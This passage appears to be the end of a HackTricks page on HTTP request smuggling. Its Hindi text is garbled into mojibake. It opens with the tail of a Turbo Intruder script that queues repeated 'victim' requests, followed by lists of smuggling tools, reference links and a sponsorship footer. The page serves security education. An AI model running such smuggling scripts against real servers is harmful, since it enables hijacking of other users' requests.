'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[рдпрд╣рд╛рдБ рд╕реЗ рдЫрд╡рд┐ред](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## рдЙрдкрдХрд░рдг

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рд╡реНрдпрд╛рдХрд░рдг-рдЖрдзрд╛рд░рд┐рдд HTTP Fuzzer рд╣реИ рдЬреЛ рдЕрдЬреАрдм request smuggling рд╡рд┐рд╕рдВрдЧрддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hacking рд╕реАрдЦреЗрдВ zero рд╕реЗ hero рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХреЛ рдлреЙрд▓реЛ рдХрд░реЗрдВ.**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА hacking tricks рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
